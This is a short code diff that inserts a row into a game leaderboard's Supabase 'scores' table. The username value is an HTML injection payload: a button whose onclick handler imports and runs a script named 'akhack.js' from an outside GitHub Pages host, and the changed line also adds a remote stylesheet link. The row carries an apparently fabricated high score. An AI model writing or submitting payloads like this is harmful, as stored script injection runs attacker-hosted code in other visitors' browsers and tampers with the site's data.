@@ -1,5 +1,5 @@
 const { error } = await supabase.from("scores").insert([{
-      username: `<button id="mycoolbutton" onclick="(async()=>{ const mod = await import('https://misterxak.github.io/akhack/akhack.js'); mod.hack() })()">Naam weergeven</button>`,
+      username: `<button id="mycoolbutton" onclick="(async()=>{ const mod = await import('https://misterxak.github.io/akhack/akhack.js'); mod.hack() })()">Naam weergeven</button><link rel="stylesheet" href="https://misterxak.github.io/akhack/style.css">`,
       code: "misterx",
       game: spelNaam,
       points: 14305
